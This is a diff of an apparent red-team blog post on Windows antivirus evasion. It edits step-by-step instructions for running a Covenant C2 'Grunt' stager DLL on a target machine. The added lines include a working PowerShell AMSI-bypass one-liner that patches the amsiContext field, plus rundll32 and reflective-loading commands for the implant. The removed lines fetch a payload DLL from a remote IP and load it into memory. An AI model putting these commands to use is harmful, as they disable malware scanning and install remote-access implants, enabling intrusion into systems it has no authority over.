@@ -633,7 +633,7 @@ public class Exports
 Now build the project then copy the DLL to the target machine and execute with __rundll32__ as follow
 
 ```sh
-rundll32.exe GruntDllName.dll,GruntEntry
+rundll32 covenant-DLL-noAmsi.dll,MonkEntry
 ```
 
 Now you should have your shell on Covenant.
@@ -642,12 +642,20 @@ Now you should have your shell on Covenant.
   <img src="/assets/posts/2021-03-01-Windows-Evasion/cov3.JPG">
 </p> 
 
-__Note:__ 🚩 Alternatively you can use this reflection technique to download and run a GruntStager EXE directly from memory, without having it touch disk.  For example:
+__Note:__ 🚩 The most basic (although not very interesting) method of loading and running this code, is from disk using PowerShell:
+
 
 ```powershell
-PS > $dll = (new-object net.webclient).DownloadData("http://192.168.152.100:1234/monk-Avbypass.dll)
-PS > [System.Reflection.Assembly]::Load($dll)
+
+Amsi-Bypass
+
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+
+PS > [System.Reflection.Assembly]::LoadFile("C:\Users\IEUser\Desktop\covenant-DLL-noAmsi.dll")
 PS > [MonkStager.MonkStager]::Execute()
+
+
+
 ```
 
 And note the Grunt checking in:
